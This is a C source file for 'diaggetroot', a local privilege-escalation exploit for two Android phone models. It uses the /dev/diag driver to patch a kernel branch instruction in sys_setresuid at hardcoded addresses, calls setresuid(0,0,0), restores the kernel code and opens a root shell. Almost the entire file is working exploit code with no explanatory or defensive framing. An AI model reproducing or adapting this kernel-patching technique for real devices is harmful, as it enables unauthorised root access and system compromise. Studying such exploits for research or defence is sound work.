/*
 * Copyright (c) 2013 Hiroyuki Ikezoe
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR(S) ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR(S) BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/system_properties.h>

#include "diag.h"

typedef struct _supported_device {
  const char *device;
  const char *build_id;
  unsigned long int sys_setresuid_check_address;
  unsigned long int delayed_rsp_id_address;
} supported_device;

supported_device supported_devices[] = {
  { "F-03D", "V24R33Cc", 0xc00e83cc, 0xc0777dd0 },
  { "F-12C", "V21",      0xc00e5ad2, 0xc075aca4 }
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static bool
detect_injection_addresses(diag_injection_addresses *injection_addresses)
{
  int i;
  char device[PROP_VALUE_MAX];
  char build_id[PROP_VALUE_MAX];

  __system_property_get("ro.product.model", device);
  __system_property_get("ro.build.display.id", build_id);

  for (i = 0; i < n_supported_devices; i++) {
    if (!strcmp(device, supported_devices[i].device) &&
        !strcmp(build_id, supported_devices[i].build_id)) {
      injection_addresses->target_address =
        supported_devices[i].sys_setresuid_check_address;
      injection_addresses->delayed_rsp_id_address =
        supported_devices[i].delayed_rsp_id_address;
        return true;
    }
  }
  printf("%s (%s) is not supported.\n", device, build_id);

  return false;
}

static bool
inject_command(const char *command,
               diag_injection_addresses *injection_addresses,
               int fd)
{
  struct values injection_data;

  injection_data.address = injection_addresses->target_address;
  injection_data.value = command[0] | (command[1] << 8);

  return inject_with_file_descriptor(&injection_data, 1,
                                     injection_addresses->delayed_rsp_id_address,
                                     fd) == 0;
}

static bool
break_sys_setresuid(diag_injection_addresses *injection_addresses,
                    int fd)
{
  const char beq[] = { 0x00, 0x0a };
  return inject_command(beq, injection_addresses, fd);
}

static bool
restore_sys_setresuid(diag_injection_addresses *injection_addresses,
                      int fd)
{
  const char bne[] = { 0x00, 0x1a };
  return inject_command(bne, injection_addresses, fd);
}

static void
usage(void)
{
  printf("Usage:\n");
  printf("\tdiaggetroot [sys_setresuid_address] [delayed_rsp_id address]\n");
}

int
main(int argc, char **argv)
{
  int fd;
  int ret;
  diag_injection_addresses injection_addresses;

  if (argc != 3) {
    if (!detect_injection_addresses(&injection_addresses)) {
      usage();
      exit(EXIT_FAILURE);
    }
  } else {
    injection_addresses.target_address = strtoul(argv[1], NULL, 16);
    injection_addresses.delayed_rsp_id_address = strtoul(argv[2], NULL, 16);
  }

  fd = open("/dev/diag", O_RDWR);
  if (fd < 0) {
    printf("failed to open /dev/diag due to %s.", strerror(errno));
    exit(EXIT_FAILURE);
  }

  ret = break_sys_setresuid(&injection_addresses, fd);
  if (ret < 0) {
    close(fd);
    exit(EXIT_FAILURE);
  }

  ret = setresuid(0, 0, 0);
  restore_sys_setresuid(&injection_addresses, fd);
  close(fd);

  if (ret < 0) {
    printf("failed to get root access\n");
    exit(EXIT_FAILURE);
  }

  system("/system/bin/sh");

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
